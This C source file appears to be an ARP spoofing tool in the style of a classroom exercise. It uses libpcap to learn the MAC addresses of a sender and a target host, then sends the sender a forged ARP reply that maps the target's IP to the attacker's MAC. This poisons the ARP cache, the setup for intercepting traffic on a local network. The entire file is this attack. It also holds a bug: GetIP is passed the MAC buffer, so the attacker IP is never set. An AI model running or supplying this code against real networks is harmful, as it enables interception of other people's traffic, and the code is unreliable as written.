#include "send_arp.h"

int main (int argc, char *argv[]) {
   pcap_t *handle;
   char errbuf[PCAP_ERRBUF_SIZE];
   const char *interface = argv[1];
   u_int8_t sender_mac[ETHER_ADDR_LEN];
   u_int8_t sender_ip[IP_ADDR_LEN];
   u_int8_t attacker_mac[ETHER_ADDR_LEN];
   u_int8_t attacker_ip[IP_ADDR_LEN];
   u_int8_t target_mac[ETHER_ADDR_LEN];
   u_int8_t target_ip[IP_ADDR_LEN];
   
   struct arp_packet *apkt;

   uint8_t tmp[ETHER_ADDR_LEN];

   inet_pton(AF_INET, argv[2], sender_ip);
   inet_pton(AF_INET, argv[3], target_ip);

   GetMAC(attacker_mac, interface);
   GetIP(attacker_mac, interface);

   printf("Attacker's MAC: ");
   printMAC(attacker_mac);
   printf("Attacker's IP : ");
   printIP(attacker_ip);

   handle = pcap_open_live(interface, BUFSIZ, 1, 1000, errbuf);

   SendARP(attacker_mac, attacker_ip, NULL, sender_ip, ARPOP_REQUEST, handle);
   //attacker_mac, attacker_ip, sender_mac, sender_ip, 
   GetMAC2(handle, tmp);
   memcpy(sender_mac, tmp, ETHER_ADDR_LEN);
   memset(tmp, 0, ETHER_ADDR_LEN);

   printf("Sender's MAC: ");
   printMAC(sender_mac);

   SendARP(attacker_mac, attacker_ip, NULL, target_ip, ARPOP_REQUEST, handle);
   //attacker_mac, attacker_ip, sender_mac, sender_ip, 
   GetMAC2(handle, tmp);
   memcpy(target_mac, tmp, ETHER_ADDR_LEN);
   memset(tmp, 0, ETHER_ADDR_LEN);

   printf("Target's MAC: ");
   printMAC(target_mac);

   SendARP(attacker_mac, target_ip, sender_mac, sender_ip, ARPOP_REPLY, handle);

   return 0;
}
